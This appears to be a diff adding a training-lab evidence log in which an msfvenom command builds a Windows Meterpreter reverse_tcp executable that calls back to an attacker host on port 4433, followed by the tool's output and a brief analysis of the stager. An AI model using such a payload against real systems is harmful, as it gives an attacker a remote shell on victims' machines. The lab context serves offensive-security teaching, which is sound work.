@@ -1,0 +1,27 @@
+=============================================================================
+DAY 4 (S08) - PAYLOAD GENERATION EVIDENCE (MSFVENOM)
+=============================================================================
+Date: 2026-11-09
+Attacker Host: Kali Linux (10.50.20.10) [Offensive Zone - VMnet3]
+Command: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.20.10 LPORT=4433 -f exe -o win.exe
+
+Execution Log:
+-----------------------------------------------------------------------------
+┌──(badguy㉿kali)-[~]
+└─$ mkdir -p ~/day4_lab && cd ~/day4_lab
+
+┌──(badguy㉿kali)-[~/day4_lab]
+└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.20.10 LPORT=4433 -f exe -o win.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 355 bytes
+Final size of exe file: 7168 bytes
+Saved as: win.exe
+
+Technical Analysis:
+-----------------------------------------------------------------------------
+1. Platform / Arch Selection: Defaulted to Windows x86 (32-bit PE). Compatible with both 32-bit and 64-bit Windows architectures via WoW64 subsystem.
+2. Stager Size: 355 bytes of raw shellcode.
+3. Executable Envelope: Final PE file size of 7,168 bytes (7 KB).
+4. Alignment with Syllabus: Exactly matches Handout Section 4.2 expected output.
